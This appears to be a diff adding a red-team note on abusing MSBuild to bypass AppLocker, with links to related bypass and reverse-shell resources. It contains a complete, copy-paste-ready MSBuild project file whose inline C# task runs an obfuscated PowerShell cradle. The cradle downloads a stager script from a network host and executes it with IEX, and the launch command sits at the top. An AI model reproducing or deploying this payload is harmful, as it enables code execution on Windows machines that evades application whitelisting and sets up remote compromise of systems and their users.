@@ -1,0 +1,57 @@
+MSBUILD
+C:\Windows\Microsoft.NET\Framework\v4.0.30319> msbuild.exe malware.xml
+
+https://github.com/giMini/PowerMemory/blob/master/RWMC/misc/reverseshell.xml
+
+
+https://github.com/Cn33liz/MSBuildShell 
+https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/ 
+https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md  
+https://oddvar.moe/2017/12/13/harden-windows-with-applocker-based-on-case-study-part-1/  
+
+##############################################################################
+Do Not Edit Below this Line - copy, paste, make a new xml file
+##############################################################################
+
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="34rfas">
+   <QWEridxnaPO />
+  </Target>
+<UsingTask
+    TaskName="QWEridxnaPO"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+<Task>
+  <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+using System;
+using System.IO;
+using System.Diagnostics;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Collections.ObjectModel;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Text;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+public class QWEridxnaPO :  Task, ITask {
+public override bool Execute() {
+string pok = "$WC=NeW-ObJeCt SySteM.NeT.WEbClieNT; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0 rv:11.0) like Gecko';$wc.HeAdErS.aDD('User-Agent',$u);$wC.pRoXy = [SYStem.NET.WEBREquest]::DefAulTwebProxy;$wc.prOxy.CrEdEntIALs = [sYsTeM.NeT.cReDeNtiaLCache]::DeFaultNETwoRKcReDentIals;$wc.dOwNloaDStriNG('http://192.168.0.15/stager.ps1') | IEX";
+Runspace runspace = RunspaceFactory.CreateRunspace();
+runspace.Open();
+RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
+Pipeline pipeline = runspace.CreatePipeline();
+pipeline.Commands.AddScript(pok);
+pipeline.Invoke();
+runspace.Close();
+return true;
+}
+}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+
